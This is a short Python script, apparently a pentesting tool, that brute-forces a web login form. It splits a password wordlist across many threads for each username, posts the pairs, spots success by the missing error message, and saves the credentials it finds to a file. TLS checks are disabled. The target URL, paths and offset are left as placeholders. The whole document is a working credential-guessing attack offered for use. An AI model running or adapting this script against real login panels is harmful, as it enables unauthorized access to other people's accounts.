#this script brute force a login panel applying threading an keeping allowing the usage of the an offset

import requests
from urllib3.exceptions import InsecureRequestWarning
import pdb, re, sys, signal, os
from pwn import *
import threading

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
main_url = "https://<base url>"

users = [ line.strip() for line in open("<users list location>", "r") ]
passwords = [ line.strip() for line in open("<Password list location>", "r") ]
passwords_amount = len(passwords)

proxy = { "https": "https://127.0.0.1:8080" }

def brute_force(user, limit_a, limit_b):
    p = log.progress('Doing the brute force')
    s = requests.session()
    r = s.get(main_url + "<path of the login panel>", verify=False, allow_redirects=True)
    counter = limit_a
    for index in range(limit_a, limit_b):
        p.status("User %s Password %s [%d/%d]" % (user, passwords[index], counter, limit_b ))
        post_data = {
            "username": user,
            "password": passwords[index],
        }

        r = s.post(main_url + "<path of the login panel>",data=post_data)
        counter+=1
        if re.findall(r"Username or password is incorrect", r.text) == []:
            p.success('Credentials are %s:%s, saved to credentials.txt' % (user, passwords[index]))
            with open("credentials.txt", "w") as credentials_file:
                credentials_file.write("%s:%s" % (user, passwords[index]))
            sys.exit(0)


def main(users):
    threads = []
    index = 42 # amount of pieces from password wordlist
    factor = int(passwords_amount/index)
    offset = <offset parameter>
    print(factor)
    for user in users:
        for i in range(0, index):
            thread = threading.Thread(target=brute_force, args=(user, factor*i + offset, factor*(i+1),))
            threads.append(thread)
            thread.start()

    # Ensure all threads complete before script finishes
    for t in threads:
        t.join()
    threads = []

   
if __name__ == "__main__":
	main(users)

    
